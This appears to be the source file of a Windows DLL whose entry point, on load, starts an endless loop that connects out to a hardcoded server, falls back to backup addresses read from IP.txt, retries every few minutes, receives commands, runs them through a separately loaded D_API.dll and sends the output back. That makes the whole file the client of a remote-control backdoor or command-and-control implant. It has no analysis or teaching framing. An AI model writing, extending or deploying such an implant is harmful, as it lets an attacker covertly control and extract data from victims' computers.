// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#define DEBUG
int ClientDLL() {
    HMODULE hModule = LoadLibrary(TEXT("A:\\Project\\c\\DLL\\D_API\\x64\\Release\\D_API.dll")); 
    typedef vector<char*>*(*ParseCommand_Function)(char* Type, char* Command, char* Parametric);
    typedef BOOL(*FreeVectorArray_Function)();
    ParseCommand_Function ParseCommand = (ParseCommand_Function)GetProcAddress(hModule, "ParseCommand");
    FreeVectorArray_Function FreeVectorArray = (FreeVectorArray_Function)GetProcAddress(hModule, "FreeVectorArray");
    while (1) {
        NewStart:
        WSAData wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;
        SOCKET TCP_Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (TCP_Client == INVALID_SOCKET) return 0;
        SAVE_FILE SaveFile;
        sockaddr_in addrServ;
        addrServ.sin_family = AF_INET;
        addrServ.sin_port = htons(IP_PORT);
        addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
        FILE* ClientIP_FILE = fopen("IP.txt", "r");
        while ((connect(TCP_Client, (LPSOCKADDR)&addrServ, sizeof(addrServ))) == SOCKET_ERROR) {
            if (ClientIP_FILE != NULL) {
                char IP[50] = { 0 };
                if (fgets(IP, 50, ClientIP_FILE) == NULL) {
                    fseek(ClientIP_FILE, 0, SEEK_SET);
                    addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
                    continue;
                }
                addrServ.sin_addr.S_un.S_addr = inet_addr(IP);
            }
#ifndef DEBUG
            Sleep(240000);// 4min
#else
            Sleep(5000);// 5s
#endif
        }
        if (ClientIP_FILE != nullptr) {
            fclose(ClientIP_FILE);
            delete ClientIP_FILE;
        }
        char RecvInfo[DATA_BUFMAX] = { 0 };
        SERVER SendInfoStructure;
        vector<char*>* SendInfoArray;
        while (1) {
            if (recv(TCP_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
                break;// 目的:重新连接
            }
            SERVER* GetInfoStructure = (SERVER*)&RecvInfo;// 解析
            // 填写信息  
            strcpy(SendInfoStructure.Type, "I");
            strcpy(SendInfoStructure.ID.Name, GetInfoStructure->ID.Name);
            SendInfoStructure.ID.Num = GetInfoStructure->ID.Num;
            // 判断内容
            if ((!strcmp(GetInfoStructure->Type, "C")) && (!strcmp(GetInfoStructure->Info, "Exit"))) {
                break;
            }
            if (ParseCommand == NULL || FreeVectorArray == NULL) {
                strcpy(SendInfoStructure.Info, "查找不到DLL函数。");
                SendInfoStructure.Size = strlen(SendInfoStructure.Info);
                if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) goto NewStart;
            }
            else {
                SendInfoArray = ParseCommand(GetInfoStructure->Type, GetInfoStructure->Command, GetInfoStructure->Info);
                for (int i = 0; i < SendInfoArray->size(); i++) {
                    strcpy(SendInfoStructure.Info, SendInfoArray->at(i));
                    SendInfoStructure.Size = strlen(SendInfoArray->at(i));
                    if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) {
                        FreeVectorArray();
                        goto NewStart;
                    }
                }
                FreeVectorArray();
            }
        }
        closesocket(TCP_Client);
        WSACleanup();
    }
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ClientDLL();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

